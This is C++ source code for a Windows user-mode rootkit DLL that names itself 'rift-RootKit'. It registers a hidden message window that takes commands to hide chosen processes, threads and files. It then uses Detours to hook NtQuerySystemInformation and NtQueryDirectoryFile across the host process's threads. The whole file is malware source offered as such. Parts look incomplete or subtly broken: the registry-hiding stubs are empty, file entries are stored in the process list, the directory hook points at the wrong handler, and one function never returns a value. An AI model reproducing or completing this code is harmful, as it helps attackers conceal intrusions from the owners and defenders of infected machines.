#include "riftrk.h"

struct IOCtlTCtx {
	HINSTANCE hInstDll;
	HANDLE hReadEvent;
};

// RootKit Controll
namespace rkc {
#define RKCTLC(fd, id) ((fd << 4) | (id & 0xf))
	long __stdcall IOCtlHandler(
		_In_     HWND   hWnd,
		_In_     uint32 uMsg,
		_In_opt_ WPARAM wParam,
		_In_opt_ LPARAM lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: // IPC Message
			{
				COPYDATASTRUCT* pcd = (COPYDATASTRUCT*)lParam;
				switch (pcd->dwData) {
				case RKCTLC(0, 0): // Add Process to hide
				case RKCTLC(0, 1): // Add ProcessThread to hide
					ProcessList.WriteLock(); {
						uint8 v0 = pcd->dwData & 0xf;
						void* mem = ProcessList.AllocateObject(4 * v0 + 5);
						*(uint8*)mem = v0;
						v0 ? *(uint64*)((ptr)mem + 1) = *(uint64*)pcd->lpData
							: *(uint32*)((ptr)mem + 1) = *(uint32*)pcd->lpData;
					} ProcessList.WriteUnlock(); break;

				case RKCTLC(0, 4): // Remove Process(Thread) to from Hide
					ProcessList.WriteLock(); {
						void* Entry = (uint32*)ProcessList.GetFirstEntry();
						do {
							if (*(uint8*)Entry == 0) {
								if (*(uint32*)((ptr)Entry + 1) == *(uint32*)pcd->lpData) {
									ProcessList.FreeObject(Entry); break;
								}
							} else if (*(uint8*)Entry == 1)
								if (*(uint32*)((ptr)Entry + 5) == *(uint32*)pcd->lpData) {
									ProcessList.FreeObject(Entry); break;
								}
						} while (Entry = ProcessList.GetNextEntry(Entry));
					} ProcessList.WriteUnlock(); break;



				case RKCTLC(1, 0): // Add File/Directory to hide
					ProcessList.WriteLock(); {
						void* mem = ProcessList.AllocateObject(pcd->cbData);
						memcpy(mem, pcd->lpData, pcd->cbData);
					} ProcessList.WriteUnlock(); break;
				case RKCTLC(1, 1): // Remove File/Directory to hide
					break;

				case RKCTLC(2, 0): // Add RegistryKey to hide
					break;
				case RKCTLC(2, 1): // Remove RegistryKey to hide
					break;

				case 0x7fffffff: // TestMessage
					return true;
				default:
					return false;
				}

				return true;
			}

		// Message-Window Creation
		case WM_NCCREATE:
			return true;
		case WM_CREATE:
			return 0;
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	long __stdcall IOCtlSetup(
		_In_opt_ void* lpParameter
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = (WNDPROC)IOCtlHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ((IOCtlTCtx*)lpParameter)->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, MAKEINTATOM(awc), wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(((IOCtlTCtx*)lpParameter)->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet == -1) {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			} else
				DispatchMessageW(&msg);
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

extern "C" __declspec(dllexport) long __stdcall DbgSetupForLoadLib(
	_In_opt_ void* lpParameter
) {
	// Setup IOCtl Handling (RootKit Control)
	HANDLE h[2];
	h[0] = CreateEventW(nullptr, false, false, nullptr);
	IOCtlTCtx ctx = { (HINSTANCE)lpParameter, h[0] };
	h[1] = CreateThread(nullptr, 0x1000, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

	WaitForMultipleObjects(2, h, false, INFINITE);
	CloseHandle(h[0]);

	dword ThreadExitCode;
	GetExitCodeThread(h[1], &ThreadExitCode);
	CloseHandle(h[1]);
	if (ThreadExitCode != STILL_ACTIVE)
		return false; // Indicated that something failed to load

	// Detour Syscall-Thunks and Update all Threads
	if (DetourTransactionBegin())
		return false; // Couldn't Start Transaction
	HANDLE hTSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hTSnap == INVALID_HANDLE_VALUE)
		return false; // Invalid Snap

	THREADENTRY32 te;
	te.dwSize = sizeof(te);
	HANDLE* hThread = nullptr;
	uint16 nThread = 0;

	if (Thread32First(hTSnap, &te)) {
		do {
			// Do not Update current Thread
			if (te.th32ThreadID == GetCurrentThreadId())
				continue;
			if (te.th32OwnerProcessID == GetCurrentProcessId()) {
				if (hThread)
					hThread = (HANDLE*)realloc(hThread, (nThread + 1) * sizeof(HANDLE));
				else
					hThread = (HANDLE*)malloc((nThread + 1) * sizeof(HANDLE));

				hThread[nThread] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				DetourUpdateThread(hThread[nThread]);
				nThread++;
			}
		} while (Thread32Next(hTSnap, &te));
	} else {
		CloseHandle(hTSnap);
		return false; // Couldn't Find Threads
	}
	CloseHandle(hTSnap);

	DetourAttach(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook);
	DetourAttach(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook);
	DetourTransactionCommit();

	// CleanUp
	for (uint32 i = 0; i < nThread; i++)
		CloseHandle(hThread[i]);
}

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ dword     fdwReason,
	_In_ void*     pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
		hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");

		return true;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return 0;
}
